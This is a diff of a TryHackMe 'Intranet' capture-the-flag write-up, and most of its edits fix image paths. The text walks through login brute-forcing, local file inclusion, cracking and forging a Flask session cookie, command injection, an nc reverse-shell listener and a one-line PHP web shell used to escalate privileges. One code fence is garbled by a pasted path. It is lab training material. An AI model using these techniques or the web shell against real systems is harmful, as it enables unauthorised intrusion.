@@ -7,7 +7,6 @@ The web application development company SecureSolaCoders has created their own i
 Magnus hired you as a third party to conduct a penetration test of their web application. Can you successfully exploit the app and achieve root access?
 
 ---
-
 ## Reconnaissance
 
 I started with a simple `nmap` scan to see the whole attack surface:
@@ -16,7 +15,7 @@ I started with a simple `nmap` scan to see the whole attack surface:
 
 There's `http` on both port `80` and `8080`. `FTP` runs on port `21`, `SSH` on `22`, `Telnet` on `23`, and `echo` on port `7`. The `echo` service stood out, since it's not commonly used nowadays. I followed up with a more detailed `nmap` scan to gather more information:
 
-![](detailed_nmap.png)
+![](images/detailed_nmap.png)
 
 I also ran `feroxbuster` to check for existing directories:
 
@@ -36,7 +35,7 @@ The placeholder in the `email` field disclosed its expected format:
 
 ```text
 firstname@securesolacoders.no
-```
+TryHackMe/Medium/Intranet/images/login_page.png```
 
 I thought about brute-forcing logins to access an employee account, but first I needed to gather employee names. The first name I had was `Magnus`, the company's boss. I found a second one, `anders`, along with a `devops@securesolacoders.no` email address, by inspecting the login page's source code:
 
@@ -93,7 +92,7 @@ john --wordlist=base_words.txt --rules=All --stdout > passwords.txt
 
 Running `hydra` again with this custom wordlist succeeded — I recovered `anders`' password and the first flag:
 
-![](anders_pass.png)
+![](images/anders_pass.png)
 ![](TryHackMe/Medium/Intranet/images/first_flag.png)
 
 ---
@@ -133,7 +132,7 @@ ffuf -w codes.txt \
   -fs=1326
 ```
 
-![](valid_code.png)
+![](images/valid_code.png)
 
 With the code, I could fully authenticate as `anders` and grab the second flag:
 
@@ -154,15 +153,15 @@ support@securesolacoders.no
 
 I considered brute-forcing passwords for those accounts too, but the login page returned `Invalid username` for all of them, so they weren't valid logins. I decided to inspect the `session` cookie instead, and found it was a Flask session cookie:
 
-![](cookie_flask.png)
+![](images/cookie_flask.png)
 
 Brute-forcing the cookie's signing key directly didn't work. While browsing the portal further, I found an `Update` button on the internal news feed. Capturing the request with Burp Suite showed it sent a `news` parameter — and that parameter was vulnerable to Local File Inclusion:
 
-![](burp_news_lfi.png)
+![](images/burp_news_lfi.png)
 
 Result:
 
-![](lfi_confirmed.png)
+![](images/lfi_confirmed.png)
 
 By setting `news` to `../../proc/self/cmdline` — which contains information about the current process — I was able to retrieve the full path of the running application:
 
@@ -196,7 +195,7 @@ with open('keys.txt', 'w') as keys:
 
 I used `hashcat` to find the correct key:
 
-![](key_cracked.png)
+![](images/key_cracked.png)
 
 With the real signing key, I could generate my own valid session cookie and swap it in for my current one. This let me log in as admin, which gave me the fourth flag:
 
@@ -208,11 +207,11 @@ With the real signing key, I could generate my own valid session cookie and swap
 
 The admin page had a `</form>` closing tag at the end of it, with no matching opening `<form>` tag anywhere on the page:
 
-![](form_admin.png)
+![](images/form_admin.png)
 
 That looked suspicious, so I checked the application's source code again, and found that forwarding a `POST` request to `/admin` with a `debug` parameter would likely run system commands:
 
-![](debug_form.png)
+![](images/debug_form.png)
 
 I sent a `POST` request with `curl` to confirm it:
 
@@ -234,7 +233,7 @@ nc -lvnp 4444
 
 This gave me a reverse shell as `devops`, along with another flag:
 
-![](fifth_flag.png)
+![](images/fifth_flag.png)
 
 ---
 
@@ -242,7 +241,7 @@ This gave me a reverse shell as `devops`, along with another flag:
 
 Next, I tried to escalate to `anders`. A quick `ps aux` listed all running processes, and some of them belonged to `anders`:
 
-![](anders_proc.png)
+![](images/anders_proc.png)
 
 I checked how those processes were started:
 
@@ -253,7 +252,7 @@ cat /proc/952/cmdline
 
 So `anders` was running the Apache server — usually that's done by `www-data`, which made this worth investigating further as a path to `anders`. The earlier `nmap` scan had shown an `http` server on port 80, though the site itself didn't contain anything interesting:
 
-![](construction_site.png)
+![](images/construction_site.png)
 
 I found that page's HTML file at `/var/www/html/index.html`, and as `devops` I had write access to that directory. That meant I could upload a malicious `.php` script to get code execution as `anders`. I created the script:
 
@@ -263,7 +262,7 @@ echo '<?php system($_GET["cmd"]) ?>' > cmd.php
 
 Then, by visiting `http://MACHINE_IP:80/cmd.php?cmd=`, I could execute commands as `anders`. Running a reverse shell through the `cmd` parameter gave me a connection as `anders` and the next flag:
 
-![](sixth_flag.png)
+![](images/sixth_flag.png)
 
 Reverse shell used:
 
